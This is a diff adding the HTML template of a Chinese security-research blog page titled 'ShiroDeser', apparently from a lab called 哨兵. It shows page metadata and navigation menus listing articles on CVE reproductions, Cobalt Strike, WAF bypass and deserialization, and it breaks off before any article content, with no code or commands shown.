@@ -1,0 +1,1464 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+<meta charset="utf-8">
+<!--dev siwtch-->
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name='apple-mobile-web-app-capable' content='yes'/>
+<meta name='full-screen' content='true'/>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<!--dev switch end-->
+<meta name="description" content="本站由哨兵安全实验室支持创办">
+
+<link rel="shortcut icon" href="/assets/img/favicon.png">
+<link type="application/atom+xml" rel="alternate" href="/feed.xml" title="© 哨兵" />
+
+
+
+<!-- Open Graph metadata -->
+<meta property="og:type" content="website" />
+<meta property="og:title" content="Shirodeser | © 哨兵" />
+<meta property="og:description" content="本站由哨兵安全实验室支持创办" />
+<meta property="og:image" content="https://bin4xin.sentrylab.cn/assets/img/logo-share.png" /> <!-- WeChat requires that thumbnail image is larger than 300x300 -->
+<meta property="og:url" content="https://bin4xin.sentrylab.cn/about/ShiroDeser/" />
+<title> ShiroDeser | © 哨兵 | Sentry CyberSecurity</title>
+
+<link rel="stylesheet" type="text/css" href="/assets/css/pace-minimal.css">
+<script src="/assets/js/pace.min.js"></script>
+<!-- Bootstrap core CSS -->
+<link href="/assets/css/bootstrap.css" rel="stylesheet">
+<!-- Custom styles for this template -->
+<link href="/assets/css/style.css" rel="stylesheet">
+<link href="/assets/css/font-awesome.min.css" rel="stylesheet">
+<link href="/assets/css/font-awesome-v4-shims.min.css" rel="stylesheet">
+<link rel="stylesheet" type="text/css" href="/assets/css/card.css">
+
+<script src="/assets/js/jquery.min.js"></script>
+<script src="/assets/js/jquery_lazyload/1.9.7/jquery.lazyload.min.js"></script>
+<script src="/assets/js/jquery.sticky/1.0.4/jquery.sticky.js"></script>
+<script src="/assets/js/bootstrap.min.js"></script>
+
+<!--mathjax-config scripts.-->
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+      tex2jax: {
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+        inlineMath: [['$$','$$']]
+      }
+    });
+</script>
+<script src="/assets/js/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+<!--mathjax-config scripts stop.-->
+
+
+
+</head>
+
+
+<body>
+    <startprint2pdfs>
+        <div id="research-content"><link rel="stylesheet" type="text/css" href="/assets/css/card.css">
+<link rel="stylesheet" type="text/css" href="/assets/css/footer.css">
+
+<script>
+	window.Researchname = "ShiroDeser";
+</script>
+
+
+
+
+<div id="help-page">
+		<div class="row markdown-body-img">
+			<!--left area: menu 左边菜单栏-->
+			<div class="position-sticky col-sm-3 ml-hide overflow-y-auto top-0 d-none d-lg-block flex-shrink-0 border-right" style="height:100vh">
+				<div tabindex="-1" class="position-sticky navbar-default d-flex flex-items-center p-4 top-0 " style="z-index:3" id="logo">
+					<a class="navbar-brand back-to-top" href="/" target="blank">
+						<picture>
+  <source srcset="/assets/img/logo-small-dark.png 1x, /assets/img/logo-small-dark@2x.png 2x, /assets/img/logo-small-dark@3x.png 3x, /assets/img/logo-small-dark@4x.png 4x" media="(prefers-color-scheme: dark)" />
+  
+  <img src="/assets/img/logo-small.jpg" srcset="/assets/img/logo-small.png 1x, /assets/img/logo-small@2x.png 2x, /assets/img/logo-small@3x.png 3x, /assets/img/logo-small@4x.png 4x" />
+  </picture>
+						
+						<a rel="" class="f4 text-semibold color-fg-default no-underline no-wrap pl-2 flex-auto" style="padding-top: 25px;">Sentry CyberSecurity© 哨兵</a>
+						
+					</a>
+				</div>
+				<ul class="nav nav-pills nav-stacked" id="help-nav">
+					
+					<details >
+						<summary class="edSFyN flex justify-between"><!--left - detail - summary-->
+							<a class="no-underline"><strong>APEREO CAS</strong></a>
+						</summary>
+						
+						<ul class="nav nav-pills nav-stacked no-underline">
+							<li id="toc-Apereo CAS < 4.2.x 反序列化远程代码执行" class="table-of-contents table-of-contents__left-border ">
+								<a href="/about/Apereo-CAS-Less-than-4-2-x-RCE/">I. APEREO CAS < 4.2.X 反序列化远程代码执行</a>
+								
+							</li>
+						</ul>
+						
+					</details>
+					
+					<details >
+						<summary class="edSFyN flex justify-between"><!--left - detail - summary-->
+							<a class="no-underline"><strong>鱼叉攻击策略</strong></a>
+						</summary>
+						
+						<ul class="nav nav-pills nav-stacked no-underline">
+							<li id="toc-鱼叉攻击策略落地：从零到一" class="table-of-contents table-of-contents__left-border ">
+								<a href="/about/Harpoon-strategy-attack-from-0-to-1/">I. 鱼叉攻击策略落地：从零到一</a>
+								
+							</li>
+						</ul>
+						
+						<ul class="nav nav-pills nav-stacked no-underline">
+							<li id="toc-鱼叉攻击策略落地：邮件网关应用" class="table-of-contents table-of-contents__left-border ">
+								<a href="/about/2022-05-17-Harpoon-strategy-attack-EmailGateway-usage/">II. 鱼叉攻击策略落地：邮件网关应用</a>
+								
+							</li>
+						</ul>
+						
+					</details>
+					
+					<details >
+						<summary class="edSFyN flex justify-between"><!--left - detail - summary-->
+							<a class="no-underline"><strong>GITLAB</strong></a>
+						</summary>
+						
+						<ul class="nav nav-pills nav-stacked no-underline">
+							<li id="toc-GitLab CVE-2020-10977 任意文件读取漏洞" class="table-of-contents table-of-contents__left-border ">
+								<a href="/about/GitLab-CVE-2020-10977/">I. GITLAB CVE-2020-10977 任意文件读取漏洞</a>
+								
+							</li>
+						</ul>
+						
+						<ul class="nav nav-pills nav-stacked no-underline">
+							<li id="toc-GitLab CVE-2020-10977 任意文件读取漏洞导致的RCE" class="table-of-contents table-of-contents__left-border ">
+								<a href="/about/GitLab-CVE-2020-10977-RCE/">II. GITLAB CVE-2020-10977 任意文件读取漏洞导致的RCE</a>
+								
+							</li>
+						</ul>
+						
+						<ul class="nav nav-pills nav-stacked no-underline">
+							<li id="toc-GitLab CVE-2021-22205 snippet RCE" class="table-of-contents table-of-contents__left-border ">
+								<a href="/about/Gitlab-RCE-with-snippet-function/">III. GITLAB CVE-2021-22205 SNIPPET RCE</a>
+								
+							</li>
+						</ul>
+						
+					</details>
+					
+					<details >
+						<summary class="edSFyN flex justify-between"><!--left - detail - summary-->
+							<a class="no-underline"><strong>COBALT STIKE</strong></a>
+						</summary>
+						
+						<ul class="nav nav-pills nav-stacked no-underline">
+							<li id="toc-Cobalt Stike服务器搭建历程" class="table-of-contents table-of-contents__left-border ">
+								<a href="/about/Cobalt-Stike-Server-build-walkthrough/">I. COBALT STIKE服务器搭建历程</a>
+								
+							</li>
+						</ul>
+						
+						<ul class="nav nav-pills nav-stacked no-underline">
+							<li id="toc-Cobalt Stike服务器隐藏真实ip" class="table-of-contents table-of-contents__left-border ">
+								<a href="/about/Cobalt-Stike-hidden-true-ip/">II. COBALT STIKE服务器隐藏真实IP</a>
+								
+							</li>
+						</ul>
+						
+						<ul class="nav nav-pills nav-stacked no-underline">
+							<li id="toc-域名前置隐藏C2服务器" class="table-of-contents table-of-contents__left-border ">
+								<a href="/about/Cobalt-Stike-C2-domain-front-hidden/">III. 域名前置隐藏C2服务器</a>
+								
+							</li>
+						</ul>
+						
+						<ul class="nav nav-pills nav-stacked no-underline">
+							<li id="toc-CS上线木马免杀入门" class="table-of-contents table-of-contents__left-border ">
+								<a href="/about/Cobalt-Stike-beacon-bypass-walkthrough/">IV. CS上线木马免杀入门</a>
+								
+							</li>
+						</ul>
+						
+					</details>
+					
+					<details >
+						<summary class="edSFyN flex justify-between"><!--left - detail - summary-->
+							<a class="no-underline"><strong>APACHE LOG4J2</strong></a>
+						</summary>
+						
+						<ul class="nav nav-pills nav-stacked no-underline">
+							<li id="toc-Apache Log4J2 RCE复现历程" class="table-of-contents table-of-contents__left-border ">
+								<a href="/about/Apache-Log4j2-RCE-WalkThrough/">I. APACHE LOG4J2 RCE复现历程</a>
+								
+							</li>
+						</ul>
+						
+						<ul class="nav nav-pills nav-stacked no-underline">
+							<li id="toc-Apache Log4J2 RCE JDK限制实验" class="table-of-contents table-of-contents__left-border ">
+								<a href="/about/Apache-log4j2-affect-By-JDK-version-walkthrough/">II. APACHE LOG4J2 RCE JDK限制实验</a>
+								
+							</li>
+						</ul>
+						
+					</details>
+					
+					<details >
+						<summary class="edSFyN flex justify-between"><!--left - detail - summary-->
+							<a class="no-underline"><strong>OCR IN BP</strong></a>
+						</summary>
+						
+						<ul class="nav nav-pills nav-stacked no-underline">
+							<li id="toc-BurpSuite验证码插件实验" class="table-of-contents table-of-contents__left-border ">
+								<a href="/about/CAPTCHA-BYPASS-WALKTHROUGH/">I. BURPSUITE验证码插件实验</a>
+								
+							</li>
+						</ul>
+						
+					</details>
+					
+					<details >
+						<summary class="edSFyN flex justify-between"><!--left - detail - summary-->
+							<a class="no-underline"><strong>CTF</strong></a>
+						</summary>
+						
+						<ul class="nav nav-pills nav-stacked no-underline">
+							<li id="toc-CTF - 代码审计向" class="table-of-contents table-of-contents__left-border ">
+								<a href="/about/CTF-Code-Audit-WalkThrough/">I. CTF - 代码审计向</a>
+								
+							</li>
+						</ul>
+						
+						<ul class="nav nav-pills nav-stacked no-underline">
+							<li id="toc-CTF - 密码学与杂项" class="table-of-contents table-of-contents__left-border ">
+								<a href="/about/CTF-Crypto-and-Misc-etc-WalkThrough/">II. CTF - 密码学与杂项</a>
+								
+							</li>
+						</ul>
+						
+					</details>
+					
+					<details >
+						<summary class="edSFyN flex justify-between"><!--left - detail - summary-->
+							<a class="no-underline"><strong>二进制研究/BIN</strong></a>
+						</summary>
+						
+						<ul class="nav nav-pills nav-stacked no-underline">
+							<li id="toc-Hikvision-ConfigurationFiles-decrypter" class="table-of-contents table-of-contents__left-border ">
+								<a href="/about/Hikvision-ConfigurationFiles-decrypter/">I. HIKVISION-CONFIGURATIONFILES-DECRYPTER</a>
+								
+							</li>
+						</ul>
+						
+						<ul class="nav nav-pills nav-stacked no-underline">
+							<li id="toc-Router-BinFile-Analysis" class="table-of-contents table-of-contents__left-border ">
+								<a href="/about/Router-BinFile-Analysis/">II. ROUTER-BINFILE-ANALYSIS</a>
+								
+							</li>
+						</ul>
+						
+					</details>
+					
+					<details >
+						<summary class="edSFyN flex justify-between"><!--left - detail - summary-->
+							<a class="no-underline"><strong>POLKIT</strong></a>
+						</summary>
+						
+						<ul class="nav nav-pills nav-stacked no-underline">
+							<li id="toc-Polkit-CVE-2021-3560" class="table-of-contents table-of-contents__left-border ">
+								<a href="/about/polkit-CVE-2021-3560/">I. POLKIT-CVE-2021-3560</a>
+								
+							</li>
+						</ul>
+						
+						<ul class="nav nav-pills nav-stacked no-underline">
+							<li id="toc-Polkit-CVE-2021-4034复现" class="table-of-contents table-of-contents__left-border ">
+								<a href="/about/polkit-CVE-2021-4034/">II. POLKIT-CVE-2021-4034复现</a>
+								
+							</li>
+						</ul>
+						
+					</details>
+					
+					<details >
+						<summary class="edSFyN flex justify-between"><!--left - detail - summary-->
+							<a class="no-underline"><strong>代理池：BASED ON SCYLLA</strong></a>
+						</summary>
+						
+						<ul class="nav nav-pills nav-stacked no-underline">
+							<li id="toc-scylla 搭建步骤" class="table-of-contents table-of-contents__left-border ">
+								<a href="/about/Thousand-people-Thousand-faces-Red-team-penetration-agent-pool-based-on-scylla/">I. SCYLLA 搭建步骤</a>
+								
+							</li>
+						</ul>
+						
+					</details>
+					
+					<details >
+						<summary class="edSFyN flex justify-between"><!--left - detail - summary-->
+							<a class="no-underline"><strong>WAF</strong></a>
+						</summary>
+						
+						<ul class="nav nav-pills nav-stacked no-underline">
+							<li id="toc-Mod-Waf-Bypass-Walkthrough" class="table-of-contents table-of-contents__left-border ">
+								<a href="/about/Mod-Waf-Bypass-Walkthrough/">I. MOD-WAF-BYPASS-WALKTHROUGH</a>
+								
+							</li>
+						</ul>
+						
+						<ul class="nav nav-pills nav-stacked no-underline">
+							<li id="toc-ModSec & CloudFlare WAF Initial Research" class="table-of-contents table-of-contents__left-border ">
+								<a href="/about/WAF-developed-by-Grayscale-forwarding/">II. MODSEC & CLOUDFLARE WAF INITIAL RESEARCH</a>
+								
+							</li>
+						</ul>
+						
+					</details>
+					
+					<details >
+						<summary class="edSFyN flex justify-between"><!--left - detail - summary-->
+							<a class="no-underline"><strong>代码审计</strong></a>
+						</summary>
+						
+						<ul class="nav nav-pills nav-stacked no-underline">
+							<li id="toc-Dynamic-analysis-of-java-framework-code" class="table-of-contents table-of-contents__left-border ">
+								<a href="/about/Dynamic-analysis-of-java-framework-code/">I. DYNAMIC-ANALYSIS-OF-JAVA-FRAMEWORK-CODE</a>
+								
+							</li>
+						</ul>
+						
+						<ul class="nav nav-pills nav-stacked no-underline">
+							<li id="toc-安全与开发之：Maven构建排错" class="table-of-contents table-of-contents__left-border ">
+								<a href="/about/ALL-mvn-build-errors/">II. 安全与开发之：MAVEN构建排错</a>
+								
+							</li>
+						</ul>
+						
+						<ul class="nav nav-pills nav-stacked no-underline">
+							<li id="toc-浪潮ClusterEngineV4.0代码审计历程" class="table-of-contents table-of-contents__left-border ">
+								<a href="/about/inspur-Cluster-Engine-V4.0-code-aduit-walkthrough/">III. 浪潮CLUSTERENGINEV4.0代码审计历程</a>
+								
+							</li>
+						</ul>
+						
+					</details>
+					
+					<details >
+						<summary class="edSFyN flex justify-between"><!--left - detail - summary-->
+							<a class="no-underline"><strong>SPRING</strong></a>
+						</summary>
+						
+						<ul class="nav nav-pills nav-stacked no-underline">
+							<li id="toc-SpringBoot-Memory-files-heapdump-Analysis" class="table-of-contents table-of-contents__left-border ">
+								<a href="/about/SpringBoot-Memory-files-heapdump-Analysis/">I. SPRINGBOOT-MEMORY-FILES-HEAPDUMP-ANALYSIS</a>
+								
+							</li>
+						</ul>
+						
+						<ul class="nav nav-pills nav-stacked no-underline">
+							<li id="toc-CVE-2022-22947 Spring-Cloud-Gateway-RCE" class="table-of-contents table-of-contents__left-border ">
+								<a href="/about/2022/CVE-2022-22947-Spring-Cloud-Gateway-RCE/">II. CVE-2022-22947 SPRING-CLOUD-GATEWAY-RCE</a>
+								
+							</li>
+						</ul>
+						
+					</details>
+					
+					<details >
+						<summary class="edSFyN flex justify-between"><!--left - detail - summary-->
+							<a class="no-underline"><strong>其他研究</strong></a>
+						</summary>
+						
+						<ul class="nav nav-pills nav-stacked no-underline">
+							<li id="toc-SQL注入原理分析" class="table-of-contents table-of-contents__left-border ">
+								<a href="/about/ALL-SQL-INJECTION-ANALYSIS/">I. SQL注入原理分析</a>
+								
+							</li>
+						</ul>
+						
+						<ul class="nav nav-pills nav-stacked no-underline">
+							<li id="toc-Struts2Deser" class="table-of-contents table-of-contents__left-border ">
+								<a href="/about/Struts2Deser/">II. STRUTS2DESER</a>
+								
+							</li>
+						</ul>
+						
+						<ul class="nav nav-pills nav-stacked no-underline">
+							<li id="toc-基于内存的Shiro框架Webshell攻击研究" class="table-of-contents table-of-contents__left-border ">
+								<a href="/about/Research-on-Webshell-Attack-of-Shiro-Framework-Based-on-Memory/">III. 基于内存的SHIRO框架WEBSHELL攻击研究</a>
+								
+							</li>
+						</ul>
+						
+						<ul class="nav nav-pills nav-stacked no-underline">
+							<li id="toc-通达OA利用代码分析" class="table-of-contents table-of-contents__left-border ">
+								<a href="/about/ToDa-OA-VulnPoc-by-java-analysis/">IV. 通达OA利用代码分析</a>
+								
+							</li>
+						</ul>
+						
+						<ul class="nav nav-pills nav-stacked no-underline">
+							<li id="toc-JRMP-Gadget" class="table-of-contents table-of-contents__left-border ">
+								<a href="/about/JRMP-Gadget/">V. JRMP-GADGET</a>
+								
+							</li>
+						</ul>
+						
+					</details>
+					
+					<details open>
+						<summary class="edSFyN flex justify-between"><!--left - detail - summary-->
+							<a class="no-underline"><strong>反序列化</strong></a>
+						</summary>
+						
+						<ul class="nav nav-pills nav-stacked no-underline">
+							<li id="toc-ShiroDeser" class="table-of-contents table-of-contents__left-border  active">
+								<a href="/about/ShiroDeser/">I. SHIRODESER</a>
+								
+							</li>
+						</ul>
+						
+						<ul class="nav nav-pills nav-stacked no-underline">
+							<li id="toc-javaDeser" class="table-of-contents table-of-contents__left-border ">
+								<a href="/about/javaDeser/">II. JAVADESER</a>
+								
+							</li>
+						</ul>
+						
+					</details>
+					
+				</ul>
+			</div><!-- side menu end. 左边菜单栏结束-->
+
+			<div class="c_banner c_c c_r c_cw c_agl c_mz c_jg c_fa c_fb"><!--start content bar. -->
+				<div class="c_fa c_fb c_iu c_iv">
+					<div class="white f2 fw4 Link—secondary text-bold">
+						
+						
+						<center><span>
+						<b style="font-family: 'DM Mono', monospace;">
+							<h4><svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 512 512"><title>Build</title><path d="M469.54,120.52h0a16,16,0,0,0-25.54-4L382.56,178a16.12,16.12,0,0,1-22.63,0L333.37,151.4a16,16,0,0,1,0-22.63l61.18-61.19a16,16,0,0,0-4.78-25.92h0C343.56,21,285.88,31.78,249.51,67.88c-30.9,30.68-40.11,78.62-25.25,131.53a15.89,15.89,0,0,1-4.49,16L53.29,367.46a64.17,64.17,0,1,0,90.6,90.64L297.57,291.25a15.9,15.9,0,0,1,15.77-4.57,179.3,179.3,0,0,0,46.22,6.37c33.4,0,62.71-10.81,83.85-31.64C482.56,222.84,488.53,157.42,469.54,120.52ZM99.48,447.15a32,32,0,1,1,28.34-28.35A32,32,0,0,1,99.48,447.15Z" style="fill:currentColor;stroke:currentColor"/></svg>
+							<a class="white f2 fw4 Link—secondary text-bold"  href="../../">..</a> /
+							<a class="white f2 fw4 Link—secondary text-bold"  href="../">
+						研究
+						 </a>/
+							<a class="white f2 fw4 Link—secondary text-bold"  反序列化 / 
+							<em>Post & Build in: 2020-05-18 by ACTION. Site Version: 2.2.1-29ab553.</em></a>
+							</h4>
+						</b>
+						</span></center>
+					</div>
+				</div>
+			</div><!--end content bar. -->
+
+			<div class="col-sm-9"><!--grid content display-->
+				<div id="help-content" class="print-overflow-visible cDEAYg"><!--page main content-->
+					<div class="visible-xs"><!--响应式::菜单::表单-->
+						<!--
+#####################################################################################################################
+|  1.Fixed navbar issues #3 visit https://github.com/Bin4xin/bin4xin.github.io/issues/3                             |
+|    change `position: fixed` to `position: sticky`                                                                 |
+|                                                                                                                   |
+|  2.Fixed navbar padding-top equals to 70px                                                                        |
+|    `./assets/css/style.scss` @import struture in `./assets/css/_struture.scss` del `padding-top=70px` in body.    |
+#####################################################################################################################-->
+<div class="navbar navbar-default navbar-fixed-top" role="navigation">
+    <div class="container">
+        <div class="navbar-header">
+            <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+            </button>
+<!-- 代码引用申明/code reference declaration:
+@ [click this icon -> scroll to top of page;] code from anquanke. visit any posts in https://www.anquanke.com/
+<del>also this icon func are under-construction</del>
+DONE.
+-->
+            <a class="navbar-brand back-to-top" style="cursor: pointer" onclick="$(&quot;html,body&quot;).animate({scrollTop:0}, 1000);">
+                <picture>
+  <source srcset="/assets/img/logo-small-dark.png 1x, /assets/img/logo-small-dark@2x.png 2x, /assets/img/logo-small-dark@3x.png 3x, /assets/img/logo-small-dark@4x.png 4x" media="(prefers-color-scheme: dark)" />
+  
+  <img src="/assets/img/logo-small.jpg" srcset="/assets/img/logo-small.png 1x, /assets/img/logo-small@2x.png 2x, /assets/img/logo-small@3x.png 3x, /assets/img/logo-small@4x.png 4x" />
+  </picture>
+            </a>
+        </div>
+        <div class="navbar-collapse collapse navbar-right">
+            <ul class="nav navbar-nav">
+                
+                <li ><a href="/">HOME</a></li>
+                <li ><a href="/blog/">BLOG</a></li>
+                <li ><a href="/categories/">CATEGORIES</a></li>
+                <li ><a href="/daily/">DAILY</a></li>
+                <li class="active"><a href="/about/">ABOUT</a></li>
+                <li ><a href="/feed.xml">RSS</a></li>
+                <li ><a href="/usage/">QUICK START</a></li>
+                
+            </ul>
+        </div><!--/.nav-collapse -->
+    </div>
+</div>
+						<div class="spacing"></div>
+						<form class="form-inline">
+							<div class="form-group">
+								<details>
+									<summary class="edSFyN flex justify-between"><!--up - detail - summary-->
+										<a><strong><label>选择: </label></strong></a>
+									</summary>
+									<ul class="nav nav-pills nav-stacked" id="help-nav">
+										
+										<details >
+											<summary class="edSFyN flex justify-between">
+												<a><strong>APEREO CAS</strong></a>
+											</summary>
+											
+											<ul class="nav nav-pills nav-stacked">
+												<li id="toc-Apereo CAS < 4.2.x 反序列化远程代码执行" class="table-of-contents table-of-contents__left-border ">
+													<a href="/about/Apereo-CAS-Less-than-4-2-x-RCE/">I. APEREO CAS < 4.2.X 反序列化远程代码执行</a>
+												</li>
+											</ul>
+											
+										</details>
+										
+										<details >
+											<summary class="edSFyN flex justify-between">
+												<a><strong>鱼叉攻击策略</strong></a>
+											</summary>
+											
+											<ul class="nav nav-pills nav-stacked">
+												<li id="toc-鱼叉攻击策略落地：从零到一" class="table-of-contents table-of-contents__left-border ">
+													<a href="/about/Harpoon-strategy-attack-from-0-to-1/">I. 鱼叉攻击策略落地：从零到一</a>
+												</li>
+											</ul>
+											
+											<ul class="nav nav-pills nav-stacked">
+												<li id="toc-鱼叉攻击策略落地：邮件网关应用" class="table-of-contents table-of-contents__left-border ">
+													<a href="/about/2022-05-17-Harpoon-strategy-attack-EmailGateway-usage/">II. 鱼叉攻击策略落地：邮件网关应用</a>
+												</li>
+											</ul>
+											
+										</details>
+										
+										<details >
+											<summary class="edSFyN flex justify-between">
+												<a><strong>GITLAB</strong></a>
+											</summary>
+											
+											<ul class="nav nav-pills nav-stacked">
+												<li id="toc-GitLab CVE-2020-10977 任意文件读取漏洞" class="table-of-contents table-of-contents__left-border ">
+													<a href="/about/GitLab-CVE-2020-10977/">I. GITLAB CVE-2020-10977 任意文件读取漏洞</a>
+												</li>
+											</ul>
+											
+											<ul class="nav nav-pills nav-stacked">
+												<li id="toc-GitLab CVE-2020-10977 任意文件读取漏洞导致的RCE" class="table-of-contents table-of-contents__left-border ">
+													<a href="/about/GitLab-CVE-2020-10977-RCE/">II. GITLAB CVE-2020-10977 任意文件读取漏洞导致的RCE</a>
+												</li>
+											</ul>
+											
+											<ul class="nav nav-pills nav-stacked">
+												<li id="toc-GitLab CVE-2021-22205 snippet RCE" class="table-of-contents table-of-contents__left-border ">
+													<a href="/about/Gitlab-RCE-with-snippet-function/">III. GITLAB CVE-2021-22205 SNIPPET RCE</a>
+												</li>
+											</ul>
+											
+										</details>
+										
+										<details >
+											<summary class="edSFyN flex justify-between">
+												<a><strong>COBALT STIKE</strong></a>
+											</summary>
+											
+											<ul class="nav nav-pills nav-stacked">
+												<li id="toc-Cobalt Stike服务器搭建历程" class="table-of-contents table-of-contents__left-border ">
+													<a href="/about/Cobalt-Stike-Server-build-walkthrough/">I. COBALT STIKE服务器搭建历程</a>
+												</li>
+											</ul>
+											
+											<ul class="nav nav-pills nav-stacked">
+												<li id="toc-Cobalt Stike服务器隐藏真实ip" class="table-of-contents table-of-contents__left-border ">
+													<a href="/about/Cobalt-Stike-hidden-true-ip/">II. COBALT STIKE服务器隐藏真实IP</a>
+												</li>
+											</ul>
+											
+											<ul class="nav nav-pills nav-stacked">
+												<li id="toc-域名前置隐藏C2服务器" class="table-of-contents table-of-contents__left-border ">
+													<a href="/about/Cobalt-Stike-C2-domain-front-hidden/">III. 域名前置隐藏C2服务器</a>
+												</li>
+											</ul>
+											
+											<ul class="nav nav-pills nav-stacked">
+												<li id="toc-CS上线木马免杀入门" class="table-of-contents table-of-contents__left-border ">
+													<a href="/about/Cobalt-Stike-beacon-bypass-walkthrough/">IV. CS上线木马免杀入门</a>
+												</li>
+											</ul>
+											
+										</details>
+										
+										<details >
+											<summary class="edSFyN flex justify-between">
+												<a><strong>APACHE LOG4J2</strong></a>
+											</summary>
+											
+											<ul class="nav nav-pills nav-stacked">
+												<li id="toc-Apache Log4J2 RCE复现历程" class="table-of-contents table-of-contents__left-border ">
+													<a href="/about/Apache-Log4j2-RCE-WalkThrough/">I. APACHE LOG4J2 RCE复现历程</a>
+												</li>
+											</ul>
+											
+											<ul class="nav nav-pills nav-stacked">
+												<li id="toc-Apache Log4J2 RCE JDK限制实验" class="table-of-contents table-of-contents__left-border ">
+													<a href="/about/Apache-log4j2-affect-By-JDK-version-walkthrough/">II. APACHE LOG4J2 RCE JDK限制实验</a>
+												</li>
+											</ul>
+											
+										</details>
+										
+										<details >
+											<summary class="edSFyN flex justify-between">
+												<a><strong>OCR IN BP</strong></a>
+											</summary>
+											
+											<ul class="nav nav-pills nav-stacked">
+												<li id="toc-BurpSuite验证码插件实验" class="table-of-contents table-of-contents__left-border ">
+													<a href="/about/CAPTCHA-BYPASS-WALKTHROUGH/">I. BURPSUITE验证码插件实验</a>
+												</li>
+											</ul>
+											
+										</details>
+										
+										<details >
+											<summary class="edSFyN flex justify-between">
+												<a><strong>CTF</strong></a>
+											</summary>
+											
+											<ul class="nav nav-pills nav-stacked">
+												<li id="toc-CTF - 代码审计向" class="table-of-contents table-of-contents__left-border ">
+													<a href="/about/CTF-Code-Audit-WalkThrough/">I. CTF - 代码审计向</a>
+												</li>
+											</ul>
+											
+											<ul class="nav nav-pills nav-stacked">
+												<li id="toc-CTF - 密码学与杂项" class="table-of-contents table-of-contents__left-border ">
+													<a href="/about/CTF-Crypto-and-Misc-etc-WalkThrough/">II. CTF - 密码学与杂项</a>
+												</li>
+											</ul>
+											
+										</details>
+										
+										<details >
+											<summary class="edSFyN flex justify-between">
+												<a><strong>二进制研究/BIN</strong></a>
+											</summary>
+											
+											<ul class="nav nav-pills nav-stacked">
+												<li id="toc-Hikvision-ConfigurationFiles-decrypter" class="table-of-contents table-of-contents__left-border ">
+													<a href="/about/Hikvision-ConfigurationFiles-decrypter/">I. HIKVISION-CONFIGURATIONFILES-DECRYPTER</a>
+												</li>
+											</ul>
+											
+											<ul class="nav nav-pills nav-stacked">
+												<li id="toc-Router-BinFile-Analysis" class="table-of-contents table-of-contents__left-border ">
+													<a href="/about/Router-BinFile-Analysis/">II. ROUTER-BINFILE-ANALYSIS</a>
+												</li>
+											</ul>
+											
+										</details>
+										
+										<details >
+											<summary class="edSFyN flex justify-between">
+												<a><strong>POLKIT</strong></a>
+											</summary>
+											
+											<ul class="nav nav-pills nav-stacked">
+												<li id="toc-Polkit-CVE-2021-3560" class="table-of-contents table-of-contents__left-border ">
+													<a href="/about/polkit-CVE-2021-3560/">I. POLKIT-CVE-2021-3560</a>
+												</li>
+											</ul>
+											
+											<ul class="nav nav-pills nav-stacked">
+												<li id="toc-Polkit-CVE-2021-4034复现" class="table-of-contents table-of-contents__left-border ">
+													<a href="/about/polkit-CVE-2021-4034/">II. POLKIT-CVE-2021-4034复现</a>
+												</li>
+											</ul>
+											
+										</details>
+										
+										<details >
+											<summary class="edSFyN flex justify-between">
+												<a><strong>代理池：BASED ON SCYLLA</strong></a>
+											</summary>
+											
+											<ul class="nav nav-pills nav-stacked">
+												<li id="toc-scylla 搭建步骤" class="table-of-contents table-of-contents__left-border ">
+													<a href="/about/Thousand-people-Thousand-faces-Red-team-penetration-agent-pool-based-on-scylla/">I. SCYLLA 搭建步骤</a>
+												</li>
+											</ul>
+											
+										</details>
+										
+										<details >
+											<summary class="edSFyN flex justify-between">
+												<a><strong>WAF</strong></a>
+											</summary>
+											
+											<ul class="nav nav-pills nav-stacked">
+												<li id="toc-Mod-Waf-Bypass-Walkthrough" class="table-of-contents table-of-contents__left-border ">
+													<a href="/about/Mod-Waf-Bypass-Walkthrough/">I. MOD-WAF-BYPASS-WALKTHROUGH</a>
+												</li>
+											</ul>
+											
+											<ul class="nav nav-pills nav-stacked">
+												<li id="toc-ModSec & CloudFlare WAF Initial Research" class="table-of-contents table-of-contents__left-border ">
+													<a href="/about/WAF-developed-by-Grayscale-forwarding/">II. MODSEC & CLOUDFLARE WAF INITIAL RESEARCH</a>
+												</li>
+											</ul>
+											
+										</details>
+										
+										<details >
+											<summary class="edSFyN flex justify-between">
+												<a><strong>代码审计</strong></a>
+											</summary>
+											
+											<ul class="nav nav-pills nav-stacked">
+												<li id="toc-Dynamic-analysis-of-java-framework-code" class="table-of-contents table-of-contents__left-border ">
+													<a href="/about/Dynamic-analysis-of-java-framework-code/">I. DYNAMIC-ANALYSIS-OF-JAVA-FRAMEWORK-CODE</a>
+												</li>
+											</ul>
+											
+											<ul class="nav nav-pills nav-stacked">
+												<li id="toc-安全与开发之：Maven构建排错" class="table-of-contents table-of-contents__left-border ">
+													<a href="/about/ALL-mvn-build-errors/">II. 安全与开发之：MAVEN构建排错</a>
+												</li>
+											</ul>
+											
+											<ul class="nav nav-pills nav-stacked">
+												<li id="toc-浪潮ClusterEngineV4.0代码审计历程" class="table-of-contents table-of-contents__left-border ">
+													<a href="/about/inspur-Cluster-Engine-V4.0-code-aduit-walkthrough/">III. 浪潮CLUSTERENGINEV4.0代码审计历程</a>
+												</li>
+											</ul>
+											
+										</details>
+										
+										<details >
+											<summary class="edSFyN flex justify-between">
+												<a><strong>SPRING</strong></a>
+											</summary>
+											
+											<ul class="nav nav-pills nav-stacked">
+												<li id="toc-SpringBoot-Memory-files-heapdump-Analysis" class="table-of-contents table-of-contents__left-border ">
+													<a href="/about/SpringBoot-Memory-files-heapdump-Analysis/">I. SPRINGBOOT-MEMORY-FILES-HEAPDUMP-ANALYSIS</a>
+												</li>
+											</ul>
+											
+											<ul class="nav nav-pills nav-stacked">
+												<li id="toc-CVE-2022-22947 Spring-Cloud-Gateway-RCE" class="table-of-contents table-of-contents__left-border ">
+													<a href="/about/2022/CVE-2022-22947-Spring-Cloud-Gateway-RCE/">II. CVE-2022-22947 SPRING-CLOUD-GATEWAY-RCE</a>
+												</li>
+											</ul>
+											
+										</details>
+										
+										<details >
+											<summary class="edSFyN flex justify-between">
+												<a><strong>其他研究</strong></a>
+											</summary>
+											
